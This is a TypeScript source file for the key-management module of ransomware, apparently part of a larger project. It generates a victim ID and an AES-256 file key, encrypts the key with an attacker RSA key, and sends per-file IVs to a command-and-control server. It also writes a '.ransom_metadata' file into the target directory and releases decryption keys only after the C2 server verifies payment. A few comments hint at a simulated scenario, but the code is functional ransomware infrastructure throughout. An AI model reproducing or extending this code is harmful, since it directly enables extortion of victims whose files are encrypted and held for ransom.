import crypto from 'crypto'
import fs from 'fs'
import path from 'path'
import { encryptRSA, decryptRSA, generateRSAKeys } from '../rsaComm'
import { RansomwareClient } from './c2Client'

// Global C2 client instance
let c2Client: RansomwareClient | null = null;

// Local storage for offline mode or when server is unavailable
// In an actual malware scenario, this would be more sophisticated
let offlineVictimId = '';
let offlineAesKey: Buffer | null = null;
let offlinePrivateKey = '';
let offlineIvMap = new Map<string, Buffer>();
let isOfflineMode = false;

// Create or get the C2 client
export function getC2Client(): RansomwareClient {
    if (!c2Client) {
        c2Client = new RansomwareClient();
    }
    return c2Client;
}

// Initialize the key management for a new victim
export async function initializeKeyManagement(): Promise<{
    victimId: string
    aesKey: Buffer
    attackerPublicKey: string
    attackerPrivateKey: string // In a real scenario, this would be kept on the attacker's server
}> {
    // Get the C2 client
    const client = getC2Client();

    try {
        // Connect to C2 server and initialize
        await client.connect();
        const initResult = await client.initialize();

        // Store results locally for offline mode backup
        offlineVictimId = initResult.victimId;
        offlineAesKey = initResult.aesKey;
        isOfflineMode = false;

        // Return the results
        return {
            victimId: initResult.victimId,
            aesKey: initResult.aesKey,
            attackerPublicKey: initResult.publicKey,
            attackerPrivateKey: '' // Will be retrieved from server during decryption
        };
    } catch (error) {
        console.error('Failed to initialize with C2 server:', error);
        
        // Fallback to local key generation if server is unreachable
        console.warn('Falling back to local key generation (offline mode)');
        
        // Generate a unique ID for the victim
        const victimId = crypto.randomBytes(8).toString('hex');

        // Generate an AES-256 key for file encryption
        const aesKey = crypto.randomBytes(32);

        // Generate RSA key pair for the attacker
        const { publicKey, privateKey } = generateRSAKeys();

        return {
            victimId,
            aesKey,
            attackerPublicKey: publicKey,
            attackerPrivateKey: privateKey
        };
    }
}

// Store the IV used for a specific file
export async function storeFileIV(
    victimId: string,
    filePath: string,
    iv: Buffer
): Promise<void> {
    // Store IV locally for metadata file creation
    offlineIvMap.set(filePath, iv);
    
    if (isOfflineMode) {
        return; // Don't attempt server communication in offline mode
    }

    try {
        // Send to C2 server
        const client = getC2Client();
        await client.storeFileIV(victimId, filePath, iv);
    } catch (error) {
        console.error(`Error storing IV on server: ${error}`);
        // Continue even if server communication fails
    }
}

// Get the IV for a specific file (only used in offline mode or from metadata)
export function getFileIV(victimId: string, filePath: string): Buffer {
    const iv = offlineIvMap.get(filePath);

    if (!iv) {
        throw new Error(`IV for file ${filePath} not found`);
    }

    return iv;
}

// Encrypt the AES key with the attacker's public key
export async function encryptAESKey(
    aesKey: Buffer,
    attackerPublicKey: string
): Promise<Buffer> {
    if (isOfflineMode) {
        // Use local RSA encryption in offline mode
        const aesKeyHex = aesKey.toString('hex');
        return encryptRSA(aesKeyHex, attackerPublicKey);
    }

    try {
        // Request C2 server to encrypt the AES key
        const client = getC2Client();
        return await client.encryptAESKey(offlineVictimId);
    } catch (error) {
        console.error(`Error encrypting AES key on server: ${error}`);
        
        // Fallback to local encryption
        console.warn('Falling back to local AES key encryption');
        const aesKeyHex = aesKey.toString('hex');
        return encryptRSA(aesKeyHex, attackerPublicKey);
    }
}

// Decrypt the AES key with the attacker's private key
export async function decryptAESKey(
    encryptedAESKey: Buffer,
    attackerPrivateKey: string
): Promise<Buffer> {
    if (isOfflineMode || attackerPrivateKey) {
        // Use local RSA decryption in offline mode or if we have the private key
        const aesKeyHex = decryptRSA(encryptedAESKey, attackerPrivateKey);
        return Buffer.from(aesKeyHex, 'hex');
    }

    // In normal online mode, this wouldn't be possible until payment
    throw new Error('AES key cannot be decrypted without payment verification');
}

// Create a metadata file with encrypted keys and IVs for each file
export function createKeyMetadataFile(
    victimId: string,
    encryptedAESKey: Buffer,
    targetDir: string
): void {
    // Convert the IV map to a serializable object
    const ivMapObj: Record<string, string> = {};

    offlineIvMap.forEach((iv: Buffer, filePath: string) => {
        // Use relative paths for better portability
        const relativePath = path.relative(targetDir, filePath);
        ivMapObj[relativePath] = iv.toString('base64');
    });    // Create the metadata object
    const metadata = {
        victimId,
        encryptedAESKey: encryptedAESKey.toString('base64'),
        ivMap: ivMapObj,
        timestamp: new Date().toISOString(),
        isOfflineMode: isOfflineMode
    }

    // Write the metadata to a file
    fs.writeFileSync(
        path.join(targetDir, '.ransom_metadata'),
        JSON.stringify(metadata, null, 2)
    )
}

// Read the metadata file to get encrypted keys and IVs
export function readKeyMetadataFile(
    metadataPath: string,
    targetDir: string
): {
    victimId: string
    ivMap: Map<string, Buffer>
} {
    // Read the metadata file
    const metadataStr = fs.readFileSync(metadataPath, 'utf8')
    const metadata = JSON.parse(metadataStr)

    // Extract the victim ID
    const victimId = metadata.victimId;

    // Convert the IV map back to a Map object
    const ivMap = new Map<string, Buffer>()

    Object.entries(metadata.ivMap).forEach(([relativePath, ivBase64]) => {
        // Convert relative paths back to absolute paths
        const absolutePath = path.join(targetDir, relativePath)
        const iv = Buffer.from(ivBase64 as string, 'base64');
        
        ivMap.set(absolutePath, iv)
        
        // Also update the offline map for future use
        offlineIvMap.set(absolutePath, iv);
    })
    
    // Set offline mode flag based on metadata
    isOfflineMode = metadata.isOfflineMode === true;

    // Set offline victim ID
    offlineVictimId = victimId;

    return {
        victimId,
        ivMap
    }
}

// Request decryption credentials after payment verification
export async function requestDecryptionCredentials(
    victimId: string,
    transactionId: string
): Promise<{
    privateKey: string;
    success: boolean;
}> {
    if (isOfflineMode) {
        // Simulate payment verification in offline mode
        return {
            privateKey: offlinePrivateKey,
            success: true
        };
    }

    try {
        // Verify payment with the C2 server
        const client = getC2Client();
        const paymentVerified = await client.verifyPayment(victimId, transactionId);

        if (!paymentVerified) {
            return {
                privateKey: '',
                success: false
            };
        }

        // Request decryption keys from the server
        const decryptionData = await client.requestDecryption(victimId);
        
        // Update the offline IV map with the server's data
        decryptionData.ivMap.forEach((iv, filePath) => {
            offlineIvMap.set(filePath, iv);
        });

        return {
            privateKey: decryptionData.privateKey,
            success: true
        };
    } catch (error) {
        console.error(`Error requesting decryption credentials: ${error}`);
        
        if (isOfflineMode) {
            // If we were in online mode but server is now unreachable,
            // try to use offline credentials
            return {
                privateKey: offlinePrivateKey,
                success: offlinePrivateKey.length > 0
            };
        }
        
        return {
            privateKey: '',
            success: false
        };
    }
}

// Clean up resources
export function cleanup(): void {
    if (c2Client) {
        c2Client.disconnect();
        c2Client = null;
    }
}
